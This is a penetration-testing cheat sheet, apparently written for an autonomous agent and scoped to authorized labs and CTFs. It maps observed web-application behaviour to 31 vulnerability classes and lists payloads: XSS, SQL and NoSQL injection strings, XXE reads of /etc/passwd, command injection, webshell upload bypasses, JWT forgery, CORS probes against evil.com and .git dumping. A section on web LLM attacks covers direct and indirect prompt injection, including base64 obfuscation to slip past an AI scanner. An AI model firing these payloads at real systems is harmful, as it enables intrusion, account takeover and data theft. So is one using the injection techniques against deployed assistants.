# Detection Fingerprints - the autonomous detection brain

Given any request, response, cookie, parameter, or UI behaviour, this file tells you **which of the 31 classes to test and the cheapest probe to confirm it** - without anyone telling you what to look for. Passive tells are things you SEE (no attack). Confirm probes are the minimal non-destructive test that proves the class is live. **These probes are deliberately minimal** - if one doesn't fire but the surface looks reachable, don't conclude "safe": escalate to the full payload set in `payload-library.md` (PayloadsAllTheThings) before ruling the class out.

> Authorized lab / CTF / scoped-engagement only.

---

## First 60 seconds - universal sweep

Run this on every new target and every new endpoint, in order. It surfaces the highest-signal tells before you commit to any one class.

```
1. DECODE EVERY COOKIE.        base64/url-decode each one -> see Cookie/token decoder below.
2. DIFF AUTH vs ANON.          Same page logged-in vs incognito -> which data/fields/params disappear?
3. MAP ACTORS.                 Make 2 accounts (A attacker, B victim) + note admin actions exist.
4. READ EVERY JS BUNDLE.       grep for "/api/", endpoint paths, hidden params, DOM sinks
                               (innerHTML, document.write, eval, location, postMessage, setAttribute).
5. ENUMERATE EVERY PARAM by NAME-CLASS.  id/url/file/q/__proto__/cmd/redirect -> param-name table below.
6. ONE TICK / BRACE / QUOTE.   Send ' " ` ${{7*7}} </b> into each reflected field -> watch errors/eval.
7. REFLECT-CHECK EVERY HEADER.  Host, X-Forwarded-Host, Origin, Referer, User-Agent -> reflected in body/links?
8. OPTIONS / METHOD-SWAP every API path.  Allow header? Does PUT/PATCH/DELETE work where GET is shown?
9. CHECK CACHE + ERROR SURFACE.  X-Cache header? Verbose stack trace? /robots.txt /.git /sitemap /backup.
10. WATCH FOR STATE & RACE.     Multi-step flows, coupons, balances, OTP -> candidates for logic/race.
```

Anything that lights up -> jump to its per-class block below.

---

## Signal -> class index

| Observation (what you see) | Candidate class(es) | Confirm probe |
|---|---|---|
| Input echoed in HTML body/attr/JS | XSS | context-break payload `'"><svg onload=alert(1)>` |
| Input flows to JS sink from `location`/`hash`/`postMessage` | DOM-based XSS / DOM | trace source->sink; `#"><img src=x onerror=alert(1)>` |
| `'` changes response / SQL error / boolean diff | SQLi | `'`->err, `'--`->ok; `' OR 1=1--`; `'||pg_sleep(5)--` |
| JSON login or `[$ne]`/`$where` accepted | NoSQLi | `{"username":{"$ne":null},"password":{"$ne":null}}` |
| `{{`,`${`,`<%=` reflected and evaluated | SSTI | `${7*7}`/`{{7*7}}`/`<%= 7*7 %>` -> `49` |
| Param holds a URL the server fetches | SSRF | swap to Collaborator / `http://169.254.169.254/` |
| XML/SVG/DOCX/SOAP body accepted | XXE | external entity -> file read or OAST callback |
| Shell metachars in param/filename | OS command injection | `& ping -c1 OAST &`; blind `& sleep 10 &` |
| `../` or filename in download/template | Path traversal / LFI | `../../../../etc/passwd` + encodings |
| Upload form (avatar/import) | File upload | `.php`/`.jsp` webshell + content-type/ext bypass |
| Cookie decodes to `O:`/`rO0AB`/`BAh`/`gASV` | Insecure deserialization | tamper object; pre-built gadget (ysoserial) |
| `Bearer eyJ...` / JWT cookie | JWT attacks | `alg:none`; weak-key brute; RS->HS confusion |
| `__proto__`/`constructor` accepted in JSON/query | Prototype pollution | `{"__proto__":{"json spaces":10}}` -> indent tell |
| `client_id`/`redirect_uri`/`response_type` | OAuth | tamper `redirect_uri`; missing `state` |
| Reset link / canonical URL built from `Host:` | Host-header attacks | `Host:` / `X-Forwarded-Host:` -> reflected in link |
| Front + back-end servers, TE/CL present | Request smuggling | CL.TE / TE.CL / H2 desync timing probe |
| `X-Cache: hit`/`Age:`/`Vary:` headers | Web cache poisoning | unkeyed header reflected -> cache-buster poison |
| `/profile.css`-style path returns *your* data | Web cache deception | `/account/wcd.css` path-delimiter trick |
| `ACAO` reflects `Origin`, `ACAC: true` | CORS | `Origin: evil.com` -> reflected with creds |
| Page sets no `X-Frame-Options`/`frame-ancestors` | Clickjacking | frame it; overlay over sensitive action |
| State change w/ no/weak anti-CSRF | CSRF | drop token; change method; strip Referer |
| `Upgrade: websocket` / live chat | WebSockets | tamper msg; cross-site WS handshake |
| `/graphql`,`/api?query=` | GraphQL | introspection (8 bypasses) -> hidden mutations |
| REST API, fields in GET not in POST docs | API testing | mass assignment; OPTIONS; method swap; SSPP |
| Low-priv session, `/admin` exists | Access control / IDOR | force-browse; swap object id; sibling endpoints |
| Client-side price/qty/state, multi-step flow | Business logic | negative/overflow values; skip steps |
| Coupon/transfer/OTP with timing window | Race conditions | single-packet parallel (Turbo Intruder) |
| Login/MFA/reset/remember-me | Authentication | enum, brute, MFA reuse, weak token |
| Stack trace / `.git` / `.bak` / debug | Information disclosure | dump `.git`; fetch `*.bak`; read trace |
| LLM chatbot with tools / reads user content | Web LLM attacks | direct + indirect prompt injection |
| Compound cookie / odd data structure | Essential-skills (targeted scan) | Burp "scan selected insertion point" on each field |

---

## Cookie / token decoder

Decode **every** cookie (base64, URL, hex) before anything else.

| Decoded prefix / shape | Encoding/format | Means | Go to |
|---|---|---|---|
| `eyJ...` `.` `...` `.` `...` | base64url, 3 dot parts | **JWT** | `JWT-attacks/` |
| `O:8:"User":...` / `a:2:{...}` | PHP serialize | **PHP object** | `Insecure-deserialization/` |
| `rO0AB...` (`AC ED 00 05`) | Java serialize (b64) | **Java object** | `Insecure-deserialization/` |
| `BAh...` | Ruby Marshal (b64) | **Ruby object** | `Insecure-deserialization/` |
| `gASV...` / `gAJ...` / `gAN...` | Python pickle (b64) | **pickle** | `Insecure-deserialization/` |
| `{"...":...}` after b64 | raw JSON | client-trusted state -> **mass assignment / tamper** | `API-testing/`, `Access-control/` |
| `data.signature` (2 parts, `.`) | Flask/Django signed | needs **SECRET_KEY** (leak via SSTI/info-disc) | `SSTI/`, `Information-disclosure/` |
| `wiener:9af...` / `user|role|sig` | delimited compound | **scan each field separately** | `Essential-skills/` |
| 32/40/64 hex, high entropy | session id | opaque -> **Burp Sequencer**; brute if weak | `Authentication/` |
| predictable (username b64, counter) | weak token | **forge/iterate** | `Authentication/`, `Access-control/` |

---

## Param-name -> likely class

The fastest fingerprint is the parameter's *name*. Triage every param by name before testing.

```
HIGH-VALUE NAMES -> CLASS

id, user, user_id, account, uuid, order, doc, invoice, num   -> IDOR / access control / GraphQL node
url, uri, link, src, dest, destination, redirect, redir,
   return, returnUrl, next, continue, callback, cb, feed,
   host, port, to, out, view, page(url), domain, site, proxy -> SSRF / open redirect  (-> OAuth token theft)
file, filename, path, filepath, template, doc, document,
   download, page(file), include, require, folder, dir,
   style, pdf, image, attachment                            -> path traversal / LFI  (-> RCE / file read)
q, query, search, s, keyword, name, title, sort, order,
   orderBy, sortBy, column, filter, where, group, having     -> SQLi / NoSQLi  (sort/orderBy often unparameterized)
__proto__, constructor, prototype, [__proto__]               -> prototype pollution
cmd, exec, command, run, ping, host, ip, addr, dns,
   query(dns), domain(lookup), shell                         -> OS command injection
email, username, login (in reset/forgot/login flows)         -> user enum / host-header reset / SSPP
amount, price, cost, qty, quantity, total, sum, discount,
   coupon, balance, credit, points, currency                 -> business logic (negative/overflow/skip)
xml, data, body, import, soap, svg, docx, xlsx, feed(xml)    -> XXE
message, content, comment, bio, html, body(html)             -> stored XSS (+ indirect prompt injection if LLM reads it)
state (oauth), nonce, code, token, redirect_uri, client_id   -> OAuth / CSRF (missing state)
callback, jsonp, function                                    -> JSONP / reflected XSS / cache
```

Low-signal names (rarely the bug): `limit, offset, first, after, locale, lang, timezone, format, theme, style(css)`.

---

## Per-class fingerprints (all 31)

Each block: **Passive tells** -> **Confirm probe** -> deep folder.

### SQL injection -> `SQL-injection/`
- **Passive:** numeric/string param in `WHERE`-shaped query; response/row-count changes; DB error strings (`ORA-`, `SQLSTATE`, `syntax near`); `sort`/`orderBy` params.
- **Confirm:** `'` -> error/diff; `'--` -> normal; `' OR 1=1--` -> more rows; `'||pg_sleep(5)--`/`'+WAITFOR DELAY '0:0:5'--` -> timed.

### NoSQL injection -> `NoSQL-injection/`
- **Passive:** JSON login body; Mongo/Express stack; params accept `[$ne]`, `[$gt]`, `$where`.
- **Confirm:** `{"username":{"$ne":null},"password":{"$ne":null}}` -> auth bypass; `admin'||'1'=='1` in syntax context.

### XSS -> `XSS/`
- **Passive:** any user input reflected in HTML/attr/JS or stored & re-rendered; missing/loose CSP.
- **Confirm:** reflect a unique marker, see the context, break out: `"><svg onload=alert(1)>` / `'-alert(1)-'` (JS) / `javascript:alert(1)` (href).

### DOM-based vulnerabilities -> `DOM-based-vulnerabilities/`
- **Passive:** JS reads `location.hash`/`.search`/`document.referrer`/`postMessage` and writes to `innerHTML`/`eval`/`location`/`setAttribute`; `addEventListener('message',...)` with no origin check; DOM-clobberable globals.
- **Confirm:** put payload in `#...`/source; watch it hit the sink. `#<img src=x onerror=alert(1)>`.

### SSTI -> `SSTI/`
- **Passive:** input reflected into a server-rendered template (name display, email, product desc); template error on `${{<%[%'"}}`.
- **Confirm:** `${7*7}`,`{{7*7}}`,`<%= 7*7 %>`,`#{7*7}`,`{7*7}` -> which renders `49` identifies the engine. Then engine-specific RCE.

### SSRF -> `SSRF/`
- **Passive:** param holds URL/host the server fetches (stock check, webhook, image proxy, PDF, import-by-URL).
- **Confirm:** swap to Burp Collaborator -> DNS/HTTP hit = blind SSRF; `http://169.254.169.254/` or `http://localhost/admin` -> internal response.

### XXE -> `XXE-injection/`
- **Passive:** `Content-Type: application/xml`/`text/xml`; SVG/DOCX/XLSX upload; any XML in body; SOAP.
- **Confirm:** declare external entity `<!ENTITY x SYSTEM "file:///etc/passwd">` -> file in response; or `SYSTEM "http://OAST"` -> OOB hit (blind). Try JSON->XML content-type swap on hidden surfaces.

### OS command injection -> `OS-command-injection/`
- **Passive:** param feeding a shell (ping, nslookup, file convert, email, feedback with system field).
- **Confirm:** `& ping -c 10 OAST &` (timing/OAST); `& nslookup OAST &`; blind: `& sleep 10 &` and measure.

### Path traversal -> `Path-traversal/`
- **Passive:** `filename=`/`file=`/`path=`/`?image=` returns file content; download endpoints.
- **Confirm:** `../../../../etc/passwd`; bypasses: `....//`, `%2e%2e%2f`, `%252e%252e%252f`, absolute `/etc/passwd`, null `...%00.png`, base-dir prefix `/var/www/images/../../../etc/passwd`.

### File upload -> `File-upload-vulnerabilities/`
- **Passive:** upload accepts/serves files (avatar, attachment); files reachable under web root.
- **Confirm:** upload `shell.php`; if blocked -> `.phtml`/`.php5`, `Content-Type: image/jpeg`, magic-byte prefix, `exploit.php%00.jpg`, path-traversal filename, `.htaccess` trick, polyglot; then browse the file -> RCE.

### Insecure deserialization -> `Insecure-deserialization/`
- **Passive:** cookie/param decodes to serialized object (see decoder); language is PHP/Java/Ruby/Python/.NET.
- **Confirm:** flip a field (`admin=0`->`1`) and re-sign/re-encode; escalate to gadget chain (ysoserial / phpggc); custom chain for app classes.

### JWT attacks -> `JWT-attacks/`
- **Passive:** `Authorization: Bearer eyJ...` or JWT cookie; `alg` in header; `/jwks.json` or `jku`/`kid` present.
- **Confirm:** edit `sub`->`administrator`, send as-is (unverified?); `alg:none` + strip sig; `hashcat -m 16500` weak key; `jwk`/`jku`/`kid` injection; RS256->HS256 confusion.

### Prototype pollution -> `Prototype-pollution/`
- **Passive:** JSON merge endpoints; query parsed into objects; client libs (jQuery/lodash). 
- **Confirm (client):** `?__proto__[foo]=bar` then `Object.prototype.foo` in console; alt vector `?__proto__.foo=bar`. **(server):** `{"__proto__":{"json spaces":10}}` -> response JSON re-indented; `{"__proto__":{"status":555}}` -> status changes.

### OAuth -> `OAuth-authentication/`
- **Passive:** `client_id`,`redirect_uri`,`response_type=code|token`,`scope`; social login; `state` present?
- **Confirm:** `redirect_uri`->external/your host -> code/token leaks; missing `state` -> CSRF account-linking; `redirect_uri` path-traversal `/oauth-callback/../post/next?path=` -> open-redirect token theft.

### Host-header attacks -> `HTTP-Host-header-attacks/`
- **Passive:** password-reset emails/links and canonical/script URLs built from `Host`; routing front-end.
- **Confirm:** `Host: evil` or `X-Forwarded-Host: evil` -> reflected in reset link/absolute URL; `Host: localhost`->admin bypass; routing SSRF via Host to internal IP.

### HTTP request smuggling -> `HTTP-request-smuggling/`
- **Passive:** front-end + back-end servers (CDN/LB); both `Content-Length` and `Transfer-Encoding` honored; HTTP/2.
- **Confirm:** CL.TE / TE.CL probe (timeout differential); H2 desync; then prefix-hijack next request -> admin/XSS.

### Web cache poisoning -> `Web-cache-poisoning/`
- **Passive:** `X-Cache`/`Age`/`Vary`/`CF-Cache-Status`; responses shared across users; reflected headers.
- **Confirm:** add cache-buster + unkeyed header (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Scheme`) reflected -> poison; param cloaking `;`, fat GET, URL normalization.

### Web cache deception -> `Web-cache-deception/`
- **Passive:** cache serves by extension/static path; app reflects path; user-specific pages.
- **Confirm:** request `/my-account/wcd.css` (delimiter/normalization) -> if cached and contains your private data, a victim's would cache too.

### CORS -> `CORS/`
- **Passive:** `Access-Control-Allow-Origin` present; API serves credentialed JSON.
- **Confirm:** `Origin: https://evil.com` -> reflected in `ACAO` + `ACAC: true`; or `Origin: null` accepted -> exfil via attacker page.

### Clickjacking -> `Clickjacking/`
- **Passive:** no `X-Frame-Options`/`CSP frame-ancestors`; sensitive one-click action (delete, transfer, change email).
- **Confirm:** load target in iframe on attacker page; overlay decoy; prefill via URL params for multistep.

### CSRF -> `CSRF/`
- **Passive:** cookie-only auth on state-change; token missing/predictable/not-tied-to-session; loose SameSite.
- **Confirm:** drop/blank the token -> still works; reuse another user's token; method swap GET; strip/spoof Referer; SameSite-Lax GET bypass.

### WebSockets -> `WebSockets/`
- **Passive:** `Upgrade: websocket`; live chat/feed; messages carry user input.
- **Confirm:** tamper a message for XSS/SQLi; cross-site WebSocket hijack via attacker page (no origin check on handshake).

### GraphQL -> `GraphQL-API-vulnerabilities/`
- **Passive:** `/graphql`,`/api`,`/v1/graphql`; `query{}`/`mutation{}`; sequential ids with gaps (hidden records).
- **Confirm:** introspection (if blocked: newline-after-`__schema`, GET, 8 bypasses); find `getUser`/credential fields; alias brute (bypass rate-limit); CSRF via form-urlencoded.

### API testing -> `API-testing/`
- **Passive:** `/api/...` paths; GET response has more fields than the POST docs; only GET shown.
- **Confirm:** strip path segs -> reach docs; `OPTIONS` -> Allow header -> PATCH/DELETE; add hidden field (mass assignment, e.g. `chosen_discount`); SSPP `%26field=x%23`.

### Access control / IDOR -> `Access-control/`
- **Passive:** object ids in URL/body; `/admin`-style paths; role decided client-side; "sibling" endpoints where 9 have auth and the 10th may not.
- **Confirm:** swap id to victim's (read), then PUT/DELETE (write); force-browse admin paths; param add `?admin=true`; old API version; method/`X-Original-URL` bypass.

### Business logic -> `Business-logic-vulnerabilities/`
- **Passive:** client-enforced price/qty/discount; multi-step workflow with skippable steps; trust in hidden fields.
- **Confirm:** negative/overflow quantity; tamper price; skip payment step; reuse coupon; alter email-domain trust; unconventional input the dev didn't model.

### Race conditions -> `Race-conditions/`
- **Passive:** limited resource (coupon, gift card, withdrawal, signup, OTP attempts) with check-then-act.
- **Confirm:** fire N parallel identical requests via single-packet attack (Turbo Intruder / Repeater group, single connection) -> limit-overrun / double-spend / MFA-attempt reset.

### Authentication -> `Authentication/`
- **Passive:** login/MFA/reset/remember-me; usernames enumerable; verbose login errors; reset tokens in URL.
- **Confirm:** user enum (message/timing diff); password brute (no lockout/IP rotation); MFA code reuse/brute/skip-step; "stay logged in" cookie predictable; reset-token weakness.

### Information disclosure -> `Information-disclosure/`
- **Passive:** stack traces, debug pages, version banners, `X-Powered-By`; `/robots.txt`, `/sitemap.xml`, `.git`, `.bak`, `/backup`, source maps.
- **Confirm:** trigger error -> read leak; `wget -r .../.git/` -> `git log -p` for secrets; fetch `*.bak`; TRACE/verbose for headers.

### Web LLM attacks -> `Web-LLM-attacks/`
- **Passive:** chatbot/assistant that can call tools (email, SQL, file, product), or that reads user-supplied content (reviews, tickets, emails); output rendered without sanitization.
- **Confirm:** ask it to list its tools/APIs; direct prompt-inject a tool call; **indirect** payload in content it later processes; insecure-output XSS; obfuscate (base64) to slip the AI scanner.

### Essential-skills (targeted scanning) -> `Essential-skills/`
- **Passive:** compound/non-standard data structures (colon/pipe-separated cookies, nested encodings) that crawlers skip.
- **Confirm:** select one field of the structure -> Burp "Scan selected insertion point" -> stored XSS / injection that a full crawl misses; exfil admin cookie via Collaborator.

---

## Reading responses like a hunter

- **Error messages:** leaked table/column/field names -> injection map; framework/version -> CVE; file paths -> traversal targets; stack snippets -> logic.
- **Response-shape diffs:** User A vs User B fields differ -> IDOR/role leak; field present only for some roles -> mass-assignment target; null vs data -> auth boundary.
- **Status/timing diffs:** existing vs non-existing id -> user/record enum; match vs no-match timing -> blind oracle; 200-for-expired-token -> session not revoked.
- **Headers:** `Set-Cookie` flags (no `HttpOnly` -> XSS->theft worth more; loose `SameSite` -> CSRF), `Vary`/`X-Cache` (cache attacks), `Via`/`Server` (smuggling/CVE).

When a tell fires, open the per-class block, confirm, then go to the topic folder for the full exploitation walkthrough and chain it via `chaining-playbook.md`.
